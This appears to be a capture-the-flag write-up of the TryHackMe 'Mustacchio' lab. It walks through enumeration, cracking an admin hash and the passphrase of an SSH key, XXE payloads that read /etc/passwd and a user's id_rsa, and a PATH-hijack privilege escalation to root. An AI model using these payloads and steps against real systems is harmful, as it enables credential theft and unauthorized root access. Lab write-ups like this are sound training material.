---
title: Mustacchio
description: 'XML external entity (XXE) injection and privilege escalation through a binary with a relative path'
pubDate: 2021-08-24
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/9150a15223eb72f053804a3975133e3d.png'
---

## ENUM
```bash
gobuster dir --url http://10.10.189.123 --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobust-root.txt -t 40
```

Found `/custom` which has an interesting file: `http://10.10.189.123/custom/js/users.bak`.

this is a SQLite 3.x database with creds:
```bash
strings users.bak
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Probably a SHA-1 hash:

```bash
hashid 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
Analyzing '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b'
[+] SHA-1
...[snip]...
```

Cracking it with hashcat:
```bash
hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --user
```

`admin:bulldog19`

With this we can login to `http://10.10.189.123:8765/`.
Once logged in we see a comment in the HTML
```html
...[snip]...
     //document.cookie = "Example=/auth/dontforget.bak";
...[snip]...
    <!-- Barry, you can now SSH in using your key!-->
...[snip]...
```

Based on the `dontforget.bak` XML we can craft a XXE to retrieve files:
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

URL-encoded payload to retrieve Barry's id_rsa key (`barry_id_rsa_enc):
```
xml=<!DOCTYPE+root+[<!ENTITY+xxe+SYSTEM+'file%3a///home/barry/.ssh/id_rsa'>]>
<comment>
++<name>Joe+Hamd</name>
++<author>Barry+Clad</author>
++<com>%26xxe%3b</com>
</comment>
```

## USER

Cracking the encrypred RSA key:

```bash
/usr/share/john/ssh2john.py barry_id_rsa_enc > id_rsa.hash

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
...[snip]...
urieljames       (barry_id_rsa_enc)
...[snip]...
```

```bash
ssh -i barry_id_rsa_enc barry@10.10.189.123 # <- urieljames
```

OR generate an unencrypted key:
```bash
openssl rsa -in barry_id_rsa_enc -out barry_id_rsa
```

and login:

```bash
ssh -i barry_id_rsa barry@10.10.189.123
```

## ROOT

In `/home/joe` we find a binary `live_log`:
```bash
find / -perm /4000 2>/dev/null | grep -Ev 'usr/|bin/|/proc')
/home/joe/live_log
```

When looking at the strings we can find that `tail` is being used to read log files:

```bash
strings /home/joe/live_log
...[snip]...
tail -f /var/log/nginx/access.log
...[snip]...
```

Logs are accessible by the `adm` group and root so this seems interesting.

The path to `tail` is not absolute so we can take this over:

```bash
echo 'bash -p' > /home/barry/tail
chmod +x /home/barry/tail
export PATH=/home/barry:$PATH
```

Now executing `live_log` gives us a bash shell with the privileges of the user executing it in the binary.

```bash
barry@mustacchio:~$ /home/joe/live_log
root@mustacchio:~# cat /root/root.txt
```
